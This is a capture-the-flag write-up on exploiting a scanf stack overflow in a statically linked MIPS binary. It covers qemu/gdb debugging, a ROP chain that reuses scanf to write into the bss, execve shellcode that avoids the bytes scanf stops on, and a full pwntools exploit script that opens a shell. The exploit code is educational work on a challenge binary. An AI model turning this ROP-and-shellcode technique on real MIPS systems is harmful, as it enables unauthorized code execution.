THIS IS GONNA BE A DESCRIPTION

## Overview
In this challenge we get a statically linked binary with a very simple vulnerability. A `scanf("%s", stack_buffer)` resulting in a classic stack buffer overflow, as can be seen in the image below.

The interesting part is that we have a `mips` binary. This was a first for me and in this writeup we will explore how I debugged and exploited this challenge.

## Debugging setup
First of all let's get a good debugging setup.

To simply run the binary we can use `qemu-mipsel-static ./pwn5`.

We can also make qemu wait for a gdb connection on port 1234 with `qemu-mipsel-static -g 1234 ./pwn5`. Then, on another terminal, we can launch `gdb-multiarch` and run the following commands to establish the connection (I added these to my `~/.gdbinit` to make this step automatic):
```
file ./pwn5
set arch mips
target remote localhost:1234
```

And we have debugging! As a side note, `pwndbg` was making qemu crash for some reason I did not investigate, but switching to `gef` fixed that problem for the most part.


## Exploit
### pc control
To start let's get `pc` (program counter) control. The program calls `scanf("%s", buf_64_sz)` and so we just need to fill the buffer with `"A"*64` and then we have control over the `fp` (frame pointer) and `ra` (return address).

![](/assets/img/2020-04-04-pwny5_main_end.png)

```py
fp = "BBBB"
ra = "CCCC"
s.sendline("A"*64 + fp + ra)
```

### pop a shell
To pop a shell, my first thought was to **ROP**, calling the `read` syscall to read `/bin/sh` to the bss, and then calling the `execve` syscall. In [linux mips syscall](https://www.linux-mips.org/wiki/Syscall) arguments are passed in registers `$a0` to `$a3` and the syscall number is passed in register `$v0`.

After looking through the gadgets (extracted with `ROPgadget --binary ./pwn5`) I noticed that, contrarily to x86, having control over the argument registers `$a0`, `$a1` and `$a2` is not very easy.

For that reason I decided to use the existing `scanf` call in the binary to get data into the `bss`. As we can see in the image below, if we jump to the highlighted address `0x400758`, we can control where the scanf will write to by controlling `$v0`.

![](/assets/img/2020-04-04-pwny5_scanf_call.png)

And that is what I did. I used a gadget to control `$v0` and then jumped to `0x400758`.
```python
def set_v0(v0):
    return "".join([
        p32(0x0046f27c), # lw $v0, 0x20($sp); lw $ra, 0x2c($sp); jr $ra ; addiu $sp, $sp, 0x30
        "X"*0x20,
        p32(v0),
        "X"*0x8,
    ])

addr_to_read_to = elf.bss(0x100)
scanf_addr = 0x400758
ROP = "".join([
    set_v0(addr_to_read_to),
    p32(scanf_addr),
])

payload = "A"*64 + p32(elf.bss(0x200)) + ROP
s.sendline(payload)
```

I also made `fp` equal `bss+0x200`, because this value will be used to set `sp` after the call to `scanf`, on the instruction `move $sp, $fp` which is analogous to `leave` on x86. (can be seen in the first picture at 0x40078c). By controlling the stack pointer, we can regain `ra` and therefore `pc` control.

At this point I also realized that I could execute shellcode on the stack, bss, etc.. since all mappings are `rwx`. Since I was already reading to the bss, I decided to read shellcode, and then jump to it.

The shellcode consisted of:
 - setting `$a1` and `$a2` to 0
 - setting `$a0` to the address of `/bin/sh` by simply subtracting 8 to the original `$a0` (determined by debugging)
 - setting `$v0` with the `execve` syscall number
 - jumping to the address of a `syscall` gadget already in the binary

**NOTE**: Ideally I would simply use the `syscall` instruction (opcode `0000000c`), but it contains the byte `0c` which would cause `scanf` to stop reading. At the time I didn't know this, but there was a simple workaround. As you can see in [mips-isa](https://www.cs.cmu.edu/afs/cs/academic/class/15740-f97/public/doc/mips-isa.pdf) page 159, the syscall opcode has a `code` field which we can use to our advantage. Assembling `syscall 0xfffff` results in opcode `03ffffcc` which does NOT contain a terminating char like before. That said, jumping to a `syscall` gadget was also simple enough and I even learned about delay slots.

If you notice there is a `nop` after the `j 0x4068bc`, which is not there by accident. In MIPS there are [branch delay slots](https://en.wikipedia.org/wiki/Delay_slot), meaning the next instruction is always executed, even if the previous instruction was a branch that was taken.

```python
mips_shellcode = asm("""
    xor $a1, $a1
    xor $a2, $a2

    addiu $a0, $a0, -8 # This will point to /bin/sh

    li $v0, 4011 # execve syscall
    j 0x4068bc # syscall gadget
    nop
""")
print disasm(mips_shellcode)

# The bytes that will stop scanf from reading
assert all([i not in "\x09\x0a\x0b\x0c\x0d\x20" for i in mips_shellcode])

payload_2 = mips_shellcode.ljust(348, "D") + p32(shellcode_addr)
s.sendline(payload_2.ljust(1132-8, "Z") + "/bin/sh")
```

And we have a shell!

## Other possible methods
Now thinking about it, since the code area is writable I guess I could have just injected my shellcode right after the `scanf` call instead of injecting it in the bss and then jumping to it.

Maybe I could even just have written the shellcode on the stack and used a gadget to jump to the stack pointer, instead of reading the second time with `scanf`.


## Exploit
Here is the full exploit:

```py
from pwn import *
import sys

LOCAL = True
if "remote" in sys.argv:
    LOCAL = False


context.clear(log_level='info', arch="mips", os='linux')
elf = ELF("pwn5")

HOST = "pwn5-01.play.midnightsunctf.se"
PORT = 10005


def go():
    if LOCAL:
        # s = process("qemu-mipsel-static -g 1234 ./pwn5".split(" "))
        s = process("qemu-mipsel-static ./pwn5".split(" "))
    else:
        s = remote(HOST, PORT)

    s.recvuntil("data:")

    def set_v0(v0):
        return "".join([
            p32(0x0046f27c), # : lw $v0, 0x20($sp) ; lw $ra, 0x2c($sp) ; jr $ra ; addiu $sp, $sp, 0x30
            "X"*0x20,
            p32(v0),
            "Z"*0x8,
        ])

    shellcode_addr = elf.bss(0x100)
    scanf_addr = 0x400758
    ROP = "".join([
        set_v0(shellcode_addr),
        p32(scanf_addr),
    ])

    payload = "A"*64 + p32(elf.bss(0x200)) + ROP
    print "Payload:", payload
    s.sendline(payload)

    mips_shellcode = asm("""
        xor $a1, $a1
        xor $a2, $a2

        addiu $a0, $a0, -8 # This will point to /bin/sh

        li $v0, 4011 # execve syscall
        j 0x4068bc # syscall gadget
        nop
    """)
    print disasm(mips_shellcode)

    # The bytes that will stop scanf from reading
    assert all([i not in "\x09\x0a\x0b\x0c\x0d\x20" for i in mips_shellcode])

    payload_2 = mips_shellcode.ljust(348, "D") + p32(shellcode_addr)
    payload_2 = payload_2.ljust(1132-8, "Z") + "/bin/sh"
    s.sendline(payload_2)

    s.interactive()

go()
```
